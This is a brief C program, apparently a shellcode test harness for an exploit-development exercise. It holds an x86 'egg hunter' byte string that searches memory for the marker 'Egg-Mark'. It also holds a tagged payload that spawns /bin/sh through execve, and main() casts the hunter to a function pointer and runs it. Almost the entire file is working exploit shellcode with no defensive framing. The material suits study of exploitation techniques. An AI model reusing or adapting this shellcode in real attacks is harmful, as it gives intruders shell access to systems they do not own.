#include <stdio.h>
#include <string.h>

unsigned char hunter[] = "\x40\x81\x78\xf8\x45\x67\x67\x2d\x75\xf6\x81\x78\xfc\x4d\x61\x72\x6b\x75\xed\xff\xd0";

unsigned char garbage1[] = "Just some garbage here...";

unsigned char payload[] = "\x45\x67\x67\x2d\x4d\x61\x72\x6b\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xcd\x80";

unsigned char garbage2[] = "And some garbage there...";

main()
{
	printf("Hunter Length:  %d\n", strlen(hunter));
	printf("Payload Length:  %d\n", strlen(payload));
	int (*ret)() = (int(*)())hunter;
	ret();
}
